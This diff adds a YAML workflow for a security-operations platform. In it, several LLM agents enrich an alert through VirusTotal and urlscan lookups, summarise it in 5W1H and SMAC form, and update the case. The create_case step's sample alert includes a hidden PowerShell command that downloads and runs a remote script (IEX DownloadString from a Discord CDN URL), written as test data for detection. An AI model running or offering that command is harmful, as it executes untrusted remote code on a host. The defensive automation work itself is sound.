@@ -1,0 +1,427 @@
+created_at: '2025-09-05T18:10:34.248716Z'
+definition:
+  actions:
+  - action: ai.agent
+    args:
+      actions:
+      - tools.virustotal.lookup_ip_address
+      model_name: gpt-4o-mini-2024-07-18
+      model_provider: openai
+      user_prompt: "<alert>\n${{ FN.serialize_yaml(ACTIONS.get_case.result.payload)\
+        \ }}\n</alert>\n\n# IP Address Enrichment Specialist\n\nYou are a Tier-1 SOC\
+        \ enrichment analyst that specialises in IP reputation and threat-intelligence\
+        \ look-ups.  \nYour ONLY tool is `tools__virustotal__lookup_ip_address`. The\
+        \ incoming alert will contain IP addresses that need enrichment.\n\n## CRITICAL\
+        \ INSTRUCTIONS \u2014 ALWAYS USE TOOL CALLS\n1. Use the available tools to\
+        \ enrich the provided alert data.\n2. If you cannot extract the required IP\
+        \ address from the alert, provide a brief explanation of why the IP could\
+        \ not be found and do not call any tools.\n3. You have no write access to\
+        \ cases \u2014 your sole responsibility is to enrich and return analysis for\
+        \ the next agent.\n\n## Tool Invocation\nInvoke `tools__virustotal__lookup_ip_address`\
+        \ with the `ip_address` argument set to the extracted IP address. Look for\
+        \ IPs in network.dest_ip, network.source_ip, host.ip_address fields.\n\n##\
+        \ Expected Follow-up Output\nAfter the tool executes you will receive the\
+        \ JSON result. Respond with ONLY plain text (no markdown) containing:\n\n\
+        Summary: [one-sentence verdict: Malicious | Benign | Suspicious | Unknown\
+        \ based on enrichment data]\n\nKey Findings:\n- [VT malicious votes count]\n\
+        - [Last analysis date]\n- [Associated malware families if any]\n- [WHOIS owner/ASN\
+        \ info]\n- [Any relevant tags or categories]\n\nRaw VT Link: [public VirusTotal\
+        \ URL]\n\nKeep this under 150 words; it will be consumed by the analyst_agent\
+        \ without modification.\n"
+    depends_on:
+    - list_attachments
+    description: ''
+    environment: null
+    for_each: []
+    interaction: null
+    join_strategy: all
+    ref: ip_address_agent
+    retry_policy:
+      max_attempts: 0
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: ai.agent
+    args:
+      actions:
+      - tools.virustotal.lookup_file_hash
+      fixed_arguments: null
+      model_name: gpt-4o-mini-2024-07-18
+      model_provider: openai
+      user_prompt: "<case_attachment_sha256>\n${{ ACTIONS.list_attachments.result[0].sha256\
+        \ }}\n</case_attachment_sha256>\n\n# File Hash / Malware Enrichment Specialist\n\
+        \nYou are a SOC enrichment analyst specialising in static malware analysis.\
+        \ Your single tool is `tools__virustotal__lookup_file_hash`.\n\n## CRITICAL\
+        \ INSTRUCTIONS \u2014 ALWAYS USE TOOL CALLS\n1. Use the available tools to\
+        \ enrich the provided alert data.\n2. If you cannot extract the required file\
+        \ data from the alert, provide a brief explanation of why the file information\
+        \ could not be found and do not call any tools.\n3. Your role is to analyze\
+        \ file content and return findings for the next agent.\n\n## Expected Follow-up\
+        \ Output\nOnce the lookup completes, respond with plain text (no markdown)\
+        \ containing:\n\nSummary: [one-sentence verdict: Malicious | Benign | Suspicious\
+        \ | Unknown based on Virustotal lookup findings]\n\nDetected Families: [comma-separated\
+        \ malware families, or \"None detected\"]\n\nStatic Indicators:\n- File hash:\
+        \ [SHA256 if available]\n- File type: [detected file type]\n- Signature names:\
+        \ [any matched signatures]\n- Dropped URLs/IPs: [any extracted network indicators]\n\
+        \nReferences: link to VirusTotal report\n\nKeep this under 150 words.\n"
+    depends_on:
+    - list_attachments
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: file_agent
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: ai.agent
+    args:
+      actions:
+      - tools.urlscan.lookup_url
+      model_name: gpt-4o-mini-2024-07-18
+      model_provider: openai
+      user_prompt: "<alert>\n${{ FN.serialize_yaml(ACTIONS.get_case.result.payload)\
+        \ }}\n</alert>\n\n# URL Enrichment Specialist\n\nYou are a SOC enrichment\
+        \ analyst specialising in URL reputation analysis. Your only tool is `tools__urlscan__lookup_url`.\n\
+        \nThe alert payload will contain URLs. Look for URLs in network.urls array,\
+        \ network.domain field, or any other URL references. Extract the most suspicious\
+        \ URL and pass it to the tool without defanging.\n\n## CRITICAL INSTRUCTIONS\
+        \ \u2014 ALWAYS USE TOOL CALLS\n1. Use the available tools to enrich the provided\
+        \ alert data.\n2. If you cannot extract a valid URL from the alert, provide\
+        \ a brief explanation of why no URL could be found and do not call any tools.\n\
+        3. Your role is to analyze URL reputation and return findings for the next\
+        \ agent.\n\n## Tool Invocation\nInvoke `tools__urlscan__lookup_url` with the\
+        \ `url` extracted from the alert payload. Prioritize URLs from network.urls\
+        \ array.\n\n## Expected Follow-up Output\nAfter execution, respond with plain\
+        \ text (no markdown) containing:\n\nSummary: [one-sentence verdict: Malicious\
+        \ | Benign | Suspicious | Unknown based on scan results]\n\nKey Observables:\n\
+        - Final URL: [resolved URL after redirects]\n- IP Address: [hosting IP]\n\
+        - ASN: [AS number and owner]\n- Detected threats: [any malicious findings]\n\
+        - Technologies: [detected web technologies]\n\nScreenshot: [link to screenshot\
+        \ if available, or \"Not available\"]\n\nRaw Report: [direct link to the full\
+        \ Urlscan report]\n\nKeep this under 150 words; it will feed into the analyst_agent.\n"
+    depends_on:
+    - list_attachments
+    description: ''
+    environment: null
+    for_each: []
+    interaction: null
+    join_strategy: all
+    ref: url_agent
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: llm.openai.chat_completion
+    args:
+      prompt: "You are an expert security analyst.\n\n<alert>\n${{ FN.serialize_yaml(ACTIONS.get_case.result.payload)\
+        \ }}\n</alert>\n\n<threat_intel>\n<ip_address>\n${{ ACTIONS.ip_address_agent.result\
+        \ }}\n</ip_address>\n<url>\n${{ ACTIONS.url_agent.result }}\n</url>\n<files>\n\
+        ${{ ACTIONS.file_agent.result }}\n</files>\n</threat_intel>\n\n<task>\nAnalyze\
+        \ the user-centric alert and provide:\n1. Extract 4-5 most important fields\
+        \ from the alert\n2. Extract important IoCs from the threat intel\n3. Create\
+        \ a concise 1-2 sentence summary\n4. Generate a binary question for user feedback\n\
+        </task>\n\n<instructions>\n1. Populate `fields` with values for **Who, What,\
+        \ When, Where, Why, How** using ORIGINAL field names, plus the SMAC labels.\n\
+        2. Set `binary_question` to a question that can be answered with yes or no.\n\
+        3. Set `alert_summary` to the alert's `Title` (or first sentence of `Description`\
+        \ if `Title` is absent).\n4. Set `hypothesis` to a plausible reason for the\
+        \ activity (e.g., phishing simulation, red-team exercise, credential misuse).\n\
+        5. Return the response in the exact JSON format specified.\n</instructions>\n\
+        \n<summary_guidelines>\nCreate a 1-2 sentence summary that:\n- Clearly identifies\
+        \ the user/identity involved\n- Describes the suspicious behavior in plain\
+        \ language\n- Mentions the key risk or concern\n- Avoids technical jargon\
+        \ where possible\n- Focuses on business impact\n\nExample summaries:\n- \"\
+        User john.doe performed an unusual number of S3 bucket enumeration calls from\
+        \ a new geographic location (Russia), which may indicate credential compromise\
+        \ or unauthorized access.\"\n- \"IAM user service-account-prod made 847 failed\
+        \ API calls to restricted services within 10 minutes, suggesting potential\
+        \ privilege escalation attempts or misconfigured automation.\"\n\nUse the\
+        \ alert's existing `Title` field if present; otherwise use the first sentence\
+        \ of the `Description` field. Do NOT paraphrase or rewrite this text.\n\n\
+        This preserves fidelity to the original detection context for analysts.\n\
+        </summary_guidelines>\n\n<binary_question_types>\nGenerate ONE binary question\
+        \ based on the alert context:\n\n**For Geographic Anomalies:**\n- \"Was this\
+        \ user expected to access AWS resources from [COUNTRY/LOCATION]?\"\n- \"Is\
+        \ [USER] authorized to work from [LOCATION]?\"\n- \"Did you access AWS resources\
+        \ from [COUNTRY/LOCATION]?\"\n- \"Are you currently working from [LOCATION]?\"\
+        \n\n**For Time-based Anomalies:**\n- \"Was [USER] expected to be working during\
+        \ [TIME_PERIOD]?\"\n- \"Is automated access from [USER] during off-hours intentional?\"\
+        \n- \"Were you working during [TIME_PERIOD]?\"\n- \"Did you intentionally\
+        \ configure automated access during off-hours?\"\n\n**For Access Pattern Anomalies:**\n\
+        - \"Was this high-volume API activity by [USER] part of planned operations?\"\
+        \n- \"Is [USER] authorized to access [SERVICE/RESOURCE_TYPE]?\"\n- \"Did you\
+        \ perform this high-volume API activity as part of your work?\"\n- \"Did you\
+        \ intentionally access [SERVICE/RESOURCE_TYPE]?\"\n\n**For New Behavior:**\n\
+        - \"Was [USER] expected to start using [NEW_SERVICE/NEW_ACCESS_PATTERN]?\"\
+        \n- \"Is this new access pattern by [USER] related to a recent project or\
+        \ role change?\"\n- \"Did you recently start using [NEW_SERVICE/NEW_ACCESS_PATTERN]?\"\
+        \n- \"Is this new access pattern related to a recent project or role change?\"\
+        \n\n**For Failed Access Attempts:**\n- \"Was [USER] expected to attempt access\
+        \ to restricted resources?\"\n- \"Is [USER] currently troubleshooting access\
+        \ issues that would explain these failures?\"\n- \"Did you attempt to access\
+        \ these restricted resources?\"\n- \"Were you troubleshooting access issues\
+        \ that would explain these failures?\"\n</binary_question_types>\n\n<smac_principles>\n\
+        In line with Rapid7's SMAC framework (Status, Malice, Action, Context):\n\
+        - **Status** \u2192 Track whether the alert is OPEN, ACKNOWLEDGED, or CLOSED\
+        \ (default to OPEN if unknown).\n- **Malice** \u2192 Classify as `malicious`\
+        \ or `benign` based **solely on the observed behavior** (do NOT mix in mitigation\
+        \ context).\n- **Action** \u2192 Recommend next step (e.g. `investigate`,\
+        \ `ignore`, `informational`).\n- **Context** \u2192 Add any relevant tags\
+        \ (e.g. `phishing-sim`, `red-team`, `ransomware`).\n\nInclude these SMAC labels\
+        \ in the output `fields` map so downstream systems can route and measure alert\
+        \ handling.\n</smac_principles>\n\n<fivew1h>\nMap the most critical details\
+        \ to the classic 5W1H structure for rapid triage:\n- **Who**  \u2192 The principal\
+        \ or user involved (e.g. `Resource.AccessKeyDetails.UserName`)\n- **What**\
+        \ \u2192 The suspicious action (e.g. `Service.Action.AwsApiCallAction.Api`\
+        \ or high-level `Type`)\n- **When** \u2192 Timestamp of the activity (e.g.\
+        \ `CreatedAt`)\n- **Where**\u2192 Source location or IP / AWS Region (e.g.\
+        \ `Service.Action.AwsApiCallAction.RemoteIpDetails.IpAddressV4` or `CountryName`)\n\
+        - **Why**  \u2192 One-line reason this is suspicious (derive from `Title`\
+        \ / `Description`)\n- **How**  \u2192 Technical method used (e.g. `Service.Action.ActionType`\
+        \ such as `AWS_API_CALL`, `NETWORK_CONNECTION`)\n</fivew1h>\n\nInclude each\
+        \ of these six elements inside `fields` using their ORIGINAL GuardDuty field\
+        \ names where applicable.\n\n<response_format>\nOutput a single, valid JSON\
+        \ object with exactly these four keys:\n{\n    \"fields\": {\n        \"<ORIGINAL_FIELD_NAME>\"\
+        : \"<value>\",\n        \"...\": \"...\",\n        \"status\": \"OPEN | ACKNOWLEDGED\
+        \ | CLOSED\",\n        \"malice\": \"malicious | benign\",\n        \"action\"\
+        : \"investigate | ignore | informational\",\n        \"context\": \"comma-separated\
+        \ tags\"\n    },\n    \"alert_summary\": \"Exact Title or first sentence of\
+        \ Description from the alert\",\n    \"hypothesis\": \"Brief assumption or\
+        \ potential root cause (Why it happened)\",\n    \"binary_question\": \"Yes/No\
+        \ question for user feedback\"\n}\n\nRequirements:\n- `fields` MUST contain\
+        \ at least the six 5W1H elements mapped to original GuardDuty field names,\
+        \ plus the four SMAC labels.\n- Keep `fields` flat\u2014no nested objects.\n\
+        - `alert_summary` MUST be copied verbatim from `Title` (preferred) or `Description`.\n\
+        - `hypothesis` should propose a plausible reason for the activity (e.g., phishing\
+        \ simulation, red-team exercise, credential misuse).\n- `binary_question`\
+        \ MUST be answerable with **yes** or **no**.\n</response_format>\n\n<example_output>\n\
+        {\n    \"fields\": {\n        \"Resource.AccessKeyDetails.UserName\": \"marketing-automation\"\
+        , // Who\n        \"Service.Action.AwsApiCallAction.Api\": \"ListBuckets\"\
+        , // What\n        \"CreatedAt\": \"2025-06-10T03:47:12Z\", // When\n    \
+        \    \"Service.Action.AwsApiCallAction.RemoteIpDetails.Country.CountryName\"\
+        : \"Russia\", // Where\n        \"Title\": \"Anomalous S3 activity from unusual\
+        \ geo\", // Why\n        \"Service.Action.ActionType\": \"AWS_API_CALL\",\
+        \ // How\n        \"status\": \"OPEN\",\n        \"malice\": \"malicious\"\
+        ,\n        \"action\": \"investigate\",\n        \"context\": \"geo-anomaly,credential-compromise\"\
+        \n    },\n    \"alert_summary\": \"Anomalous S3 activity from unusual geo\"\
+        ,\n    \"hypothesis\": \"Credentials may have been phished or reused by a\
+        \ malicious actor outside the corporate region.\",\n    \"binary_question\"\
+        : \"Was the marketing-automation user expected to access AWS resources from\
+        \ Russia?\"\n    \"binary_question\": \"Did you access AWS resources from\
+        \ Russia?\"\n}\n</example_output>"
+    depends_on:
+    - file_agent
+    - ip_address_agent
+    - url_agent
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: summarize
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: ai.agent
+    args:
+      actions:
+      - core.cases.update_case
+      model_name: gpt-4o-mini-2024-07-18
+      model_provider: openai
+      user_prompt: 'You are an expert case management analyst.
+
+
+        <case_id>
+
+        ${{ TRIGGER.case_id }}
+
+        </case_id>
+
+
+        <incident_analysis>
+
+        ${{ ACTIONS.summarize.result }}
+
+        </incident_analysis>
+
+
+        <task>
+
+        Use the tool `core.cases.update_case` to update the case with id <case_id>:
+
+        1. Update the case description with a Markdown version of the incident analysis
+
+        2. Update the severity and priority of the case given the incident analysis
+
+        </task>'
+    depends_on:
+    - summarize
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: update_case
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: core.cases.create_case
+    args:
+      description: '[Fill 5W 1H analysis here]'
+      payload:
+        alert_status: NEW
+        alert_title: Suspicious PowerShell connecting to external service
+        command_line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command
+          "IEX (New-Object Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/1189457823094/1198745632897/update.ps1')"
+        detection_id: ldt:f4d8c9b2-3a1e-4f8d-9c2b-1a3e4f8d9c2b:1738294847
+        file_hash: a3f7c8d9e2b1f4a5c6d7e8f9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9
+        file_path: C:\Users\accounting\Downloads\Globex_Automation_SEC598_Financial_Report.docm
+        hostname: GLOBEX-ACC-WS047
+        network_connections:
+        - destination_domain: cdn.discordapp.com
+          destination_ip: 162.159.128.233
+          destination_port: 443
+        - destination_ip: 185.220.101.45
+          destination_port: 443
+        - destination_ip: 104.21.48.162
+          destination_port: 80
+        - destination_ip: 162.55.188.102
+          destination_port: 8080
+        occurred_at: '2025-01-31T14:23:47.892000Z'
+        pattern_id: cs-pattern-9847563
+        process_tree:
+          child: 'powershell.exe (PID: 7264)'
+          parent: 'WINWORD.EXE (PID: 4892)'
+        severity: HIGH
+        tactic: Command and Control
+        technique: T1102 - Web Service
+        username: GLOBEX\accounting_user
+      summary: Suspicious macro execution phishing campaign
+    depends_on: []
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: create_case
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: ${{ FN.is_null(TRIGGER.case_id) }}
+    start_delay: 0.0
+    wait_until: null
+  - action: core.cases.get_case
+    args:
+      case_id: ${{ TRIGGER.case_id }}
+    depends_on: []
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: get_case
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: ${{ TRIGGER.case_id }}
+    start_delay: 0.0
+    wait_until: null
+  - action: ai.agent
+    args:
+      actions:
+      - core.cases.create_comment
+      model_name: gpt-4o-mini-2024-07-18
+      model_provider: openai
+      user_prompt: 'You are an expert security analyst.
+
+
+        <case_id>
+
+        ${{ TRIGGER.case_id }}
+
+        </case_id>
+
+
+        <incident_analysis>
+
+        ${{ ACTIONS.summarize.result.output }}
+
+        </incident_analysis>
+
+
+        <task>
+
+        Use the tool `core.cases.create_comment` to create a comment with 4-5 mitigation
+        recommendations given the incident analysis.
+
+        </task>'
+    depends_on:
+    - update_case
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: update_comments
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  - action: core.cases.list_attachments
+    args:
+      case_id: ${{ TRIGGER.case_id }}
+    depends_on:
+    - get_case
+    description: ''
+    environment: null
+    for_each: null
+    interaction: null
+    join_strategy: all
+    ref: list_attachments
+    retry_policy:
+      max_attempts: 1
+      retry_until: null
+      timeout: 300
+    run_if: null
+    start_delay: 0.0
+    wait_until: null
+  config:
+    environment: default
+    timeout: 300.0
+  description: ''
+  entrypoint:
+    expects: {}
+    ref: null
+  error_handler: null
+  inputs: {}
+  returns: null
+  title: Alert enrichment agent
+  triggers: []
+updated_at: '2025-09-05T18:10:34.248844Z'
+version: 25
+workflow_id: fd178fba-1368-402f-a06b-60228f711675
+workspace_id: e5a019d9-4eda-49d8-b300-eb7e8b9bc24d
